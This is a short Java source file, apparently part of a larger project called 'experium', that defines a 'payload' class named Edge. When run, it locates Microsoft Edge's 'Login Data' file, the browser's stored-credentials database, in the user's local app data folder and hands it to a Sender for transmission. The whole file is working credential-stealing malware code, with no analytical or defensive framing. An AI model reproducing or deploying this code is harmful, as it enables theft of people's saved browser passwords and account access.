package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;
import dev._3000IQPlay.experium.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final
class Edge implements Payload {
    @Override
    public
    void execute () {
        Optional <File> file = FileUtil.getFile(System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data");
        file.ifPresent(Sender::send);
    }
}